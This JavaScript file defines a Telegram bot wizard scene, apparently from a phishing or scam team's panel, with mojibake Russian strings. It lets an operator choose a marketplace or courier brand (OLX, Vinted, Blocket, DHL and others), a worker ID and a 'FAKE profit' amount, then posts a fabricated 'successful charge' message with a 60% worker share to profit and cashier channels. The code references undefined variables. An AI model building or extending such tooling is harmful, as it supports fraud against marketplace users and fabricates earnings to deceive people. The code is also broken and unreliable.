const { Scenes } = require('telegraf')
const config = require('../../configs/config.json')
const convertCurr = require('../other/convertCurr')
const currency = require('currency.js')

const fakeScene = new Scenes.WizardScene('fakescene', async (ctx) => {
    try {
        ctx.wizard.state.data = {}
        await ctx.replyWithHTML('‚öúÔ∏è <b>–í—ã–±–µ—Ä–∏—Ç–µ —Å–µ—Ä–≤–∏—Å</b>', {
            reply_markup: {
                resize_keyboard: true,
                keyboard: [
                    [{ text: 'üá∏üá™ Blocket 2.0' }, { text: 'üá∏üá™ Postnord 2.0' }, { text: 'üá∏üá™ UBER 2.0' }],
                    [{ text: 'üáµüáπ OLX 2.0' }, { text: 'üáµüáπ CTT 2.0' }, { text: 'üáµüáπ MBWAY 2.0' }, { text: 'üáµüáπ UBER 2.0' }],
                    [{ text: 'üá∑üá¥ OLX 2.0' }, { text: 'üá∑üá¥ FanCourier 2.0' }],
                    [{ text: 'üáÆüáπ Subito 2.0' }],
                    [{ text: 'üáµüá± OLX 2.0' }, { text: 'üáµüá± InPost 2.0' }, { text: 'üáµüá± Vinted 2.0' }],
                    [{ text: 'üè¥Û†ÅßÛ†Å¢Û†Å•Û†ÅÆÛ†ÅßÛ†Åø Gumtree 2.0' }, { text: 'üá¶üá∫ Gumtree 2.0' }],
                    [{ text: 'üá™üá∏ Milanuncios 1.0' }, { text: 'üá™üá∏ Milanuncios 2.0' }, { text: 'üá™üá∏ Wallapop 1.0' }, { text: 'üá™üá∏ Wallapop 2.0' }, { text: 'üá™üá∏ Correos 2.0' }],
                    [{ text: 'üáÆüáπ BlaBlaCar 1.0' }, { text: 'üá™üá∏ BlaBlaCar 1.0' }, { text: 'üá´üá∑ BlaBlaCar 1.0' }, { text: 'üá©üá™ BlaBlaCar 1.0' }],
                    [{ text: 'üó∫ BlaBlaCar 1.0 (–í–ï–°–¨ –ú–ò–†)' }],
                    [{ text: 'üáÆüáπ BlaBlaCar 2.0' }, { text: 'üá™üá∏ BlaBlaCar 2.0' }, { text: 'üá´üá∑ BlaBlaCar 2.0' }, { text: 'üá©üá™ BlaBlaCar 2.0' }],
                    [{ text: 'üó∫ BlaBlaCar 2.0 (–í–ï–°–¨ –ú–ò–†)' }],
                    [{ text: 'üá©üá™ Vinted 2.0' }, { text: 'üá™üá∏ Vinted 2.0' }, { text: 'üáÆüáπ Vinted 2.0' }, { text: 'üáµüá± Vinted 2.0' }],
                    [{ text: 'üá©üá™ Quoka 2.0' }, { text: 'üá©üá™ DHL 2.0' }, { text: 'üá©üá™ Ebay 1.0' }, { text: 'üá©üá™ Ebay 2.0' }],
                    [{ text: 'üá∏üá∞ BAZAR.SK 2.0' }, { text: 'üá∏üá∞ SBAZAR.SK 2.0' }, { text: 'üá∏üá∞ POSTA.SK 2.0' }, { text: 'üá∏üá∞ BAZOS.SK 2.0' }],
                    [{ text: '–ù–∞–∑–∞–¥' }]
                ]
            }
        })

        return await ctx.wizard.next()
    } catch (e) {
        await ctx.replyWithHTML(`–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –∫–æ–º–∞–Ω–¥–∞. –í–µ—Ä–Ω–∏—Ç–µ—Å—å –≤ –º–µ–Ω—é.`, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: 'üñá –í–µ—Ä–Ω—É—Ç—å—Å—è –≤ –º–µ–Ω—é', callback_data: '‚¨ÖÔ∏è –ù–∞–∑–∞–¥' }]
                ]
            }
        })

        return ctx.scene.leave()
    }
}, async (ctx) => {
    try {
        if (ctx.message.text == '–ù–∞–∑–∞–¥') {
            await ctx.replyWithHTML(`–í–µ—Ä–Ω–∏—Ç–µ—Å—å –≤ –º–µ–Ω—é.`, {
                reply_markup: {
                    inline_keyboard: [
                        [{ text: 'üñá –í–µ—Ä–Ω—É—Ç—å—Å—è –≤ –º–µ–Ω—é', callback_data: '‚¨ÖÔ∏è –ù–∞–∑–∞–¥' }]
                    ]
                }
            })
    
            return ctx.scene.leave()
        } else {
            ctx.wizard.state.data.service = ctx.message.text
            await ctx.replyWithHTML(`‚öúÔ∏è <b>–í–≤–µ–¥–∏—Ç–µ ID –≤–æ—Ä–∫–µ—Ä–∞</b>`)
            return ctx.wizard.next()
        }
    } catch (e) {
        await ctx.replyWithHTML(`–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –∫–æ–º–∞–Ω–¥–∞. –í–µ—Ä–Ω–∏—Ç–µ—Å—å –≤ –º–µ–Ω—é.`, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: 'üñá –í–µ—Ä–Ω—É—Ç—å—Å—è –≤ –º–µ–Ω—é', callback_data: '‚¨ÖÔ∏è –ù–∞–∑–∞–¥' }]
                ]
            }
        })

        return ctx.scene.leave()
    }
}, async (ctx) => {
    try {
        if (ctx.message.text == '–ù–∞–∑–∞–¥') {
            await ctx.replyWithHTML(`–í–µ—Ä–Ω–∏—Ç–µ—Å—å –≤ –º–µ–Ω—é.`, {
                reply_markup: {
                    inline_keyboard: [
                        [{ text: 'üñá –í–µ—Ä–Ω—É—Ç—å—Å—è –≤ –º–µ–Ω—é', callback_data: '‚¨ÖÔ∏è –ù–∞–∑–∞–¥' }]
                    ]
                }
            })
    
            return ctx.scene.leave()
        } else {
            ctx.wizard.state.data.id = ctx.message.text
            await ctx.replyWithHTML(`‚öúÔ∏è <b>–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –§–ï–ô–ö –ø—Ä–æ—Ñ–∏—Ç–∞</b>`)
            return ctx.wizard.next()
        }
    } catch (e) {
        await ctx.replyWithHTML(`–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –∫–æ–º–∞–Ω–¥–∞. –í–µ—Ä–Ω–∏—Ç–µ—Å—å –≤ –º–µ–Ω—é.`, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: 'üñá –í–µ—Ä–Ω—É—Ç—å—Å—è –≤ –º–µ–Ω—é', callback_data: '‚¨ÖÔ∏è –ù–∞–∑–∞–¥' }]
                ]
            }
        })

        return ctx.scene.leave()
    }
}, async (ctx) => {
    try {
        if (ctx.message.text == '–ù–∞–∑–∞–¥') {
            await ctx.replyWithHTML(`–í–µ—Ä–Ω–∏—Ç–µ—Å—å –≤ –º–µ–Ω—é.`, {
                reply_markup: {
                    inline_keyboard: [
                        [{ text: 'üñá –í–µ—Ä–Ω—É—Ç—å—Å—è –≤ –º–µ–Ω—é', callback_data: '‚¨ÖÔ∏è –ù–∞–∑–∞–¥' }]
                    ]
                }
            })
    
            return ctx.scene.leave()
        } else {
            ctx.wizard.state.data.price = ctx.message.text
            let valuta = ``

            if (ctx.wizard.state.data.service.includes('üá∏üá™')) {
                valuta = `SEK`
            } else if ((ctx.wizard.state.data.service.includes('üáµüáπ')) || (ctx.wizard.state.data.service.includes('üåç')) || (ctx.wizard.state.data.service.includes('üáÆüáπ')) || (ctx.wizard.state.data.service.includes('üá™üá∏')) || (ctx.wizard.state.data.service.includes('üá©üá™')) || (res.service.includes('üá´üá∑')) || (res.service.includes('üá©üá™'))) {
                valuta = `EUR`
            } else if (ctx.wizard.state.data.service.includes('üá∑üá¥')) {
                valuta = `RON`
            } else if (ctx.wizard.state.data.service.includes('üáßüáæ')) {
                valuta = `BYN`
            } else if (ctx.wizard.state.data.service.includes('üáµüá±')) {
                valuta = `PLN`
            } else if (ctx.wizard.state.data.service.includes('üá¶üá∫')) {
                valuta = `AUD`
            } else if (ctx.wizard.state.data.service.includes('üè¥')) {
                valuta = `GBP`
            } else if (ctx.wizard.state.data.service.includes('üá®üá¶')) {
                valuta = `CAN`
            } else if (res.service.includes('üá≠üá∑')) {
                valuta = `HRK`
            } else if (res.service.includes('üá®üá≠')) {
                valuta = 'CHF'
            }

            await convertCurr(ctx.wizard.state.data.price, `RUB`, valuta, async (res_val) => {
                await ctx.telegram.sendMessage(config.bot.profits_channel, `<b>${ctx.wizard.state.data.service}</b>\nüéä <b>–£–°–ü–ï–®–ù–û–ï –°–ü–ò–°–ê–ù–ò–ï</b> üéä\nüí∑ <b>–°—É–º–º–∞:</b> <b>${currency(parseInt(ctx.wizard.state.data.price), { separator: ' ', symbol: '', }).format()}</b> <b>RUB /</b> <b>${currency(parseInt(res_val), { separator: ' ', symbol: '' }).format()}</b> <b>${valuta}</b>\nüìä <b>–ü—Ä–æ—Ü–µ–Ω—Ç –≤–æ—Ä–∫–µ—Ä–∞:</b> <b>60</b>%\nüåö <b>–í–æ—Ä–∫–µ—Ä:</b> #${ctx.wizard.state.data.id}`, { parse_mode: 'HTML' })
                await ctx.telegram.sendMessage(config.bot.cassa_chat, `<b>${ctx.wizard.state.data.service}</b>\nüéä <b>–£–°–ü–ï–®–ù–û–ï –°–ü–ò–°–ê–ù–ò–ï</b> üéä\nüí∑ <b>–°—É–º–º–∞:</b> <b>${currency(parseInt(ctx.wizard.state.data.price), { separator: ' ', symbol: '', }).format()}</b> <b>RUB /</b> <b>${currency(parseInt(res_val), { separator: ' ', symbol: '' }).format()}</b> <b>${valuta}</b>\nüìä <b>–ü—Ä–æ—Ü–µ–Ω—Ç –≤–æ—Ä–∫–µ—Ä–∞:</b> <code>60</code>%\nüåö –í–æ—Ä–∫–µ—Ä: #${ctx.wizard.state.data.id}`, { 
                    parse_mode: 'HTML',
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: '–§–µ–π–∫–æ–≤—ã–π', callback_data: 'fakepOROFOSD' }]
                        ]
                    }
                })
            })

            await account.findOneAndUpdate({ tgID: 2132279041 }, { $inc: { total_profits: 1, profit_sum_rub: ctx.wizard.state.data.price, profit_sum_eur: 1 }}).exec()

            return ctx.scene.leave()
        }
    } catch (e) {
        await ctx.replyWithHTML(`–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –∫–æ–º–∞–Ω–¥–∞. –í–µ—Ä–Ω–∏—Ç–µ—Å—å –≤ –º–µ–Ω—é.`, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: 'üñá –í–µ—Ä–Ω—É—Ç—å—Å—è –≤ –º–µ–Ω—é', callback_data: '‚¨ÖÔ∏è –ù–∞–∑–∞–¥' }]
                ]
            }
        })

        return ctx.scene.leave()
    }
})

module.exports = fakeScene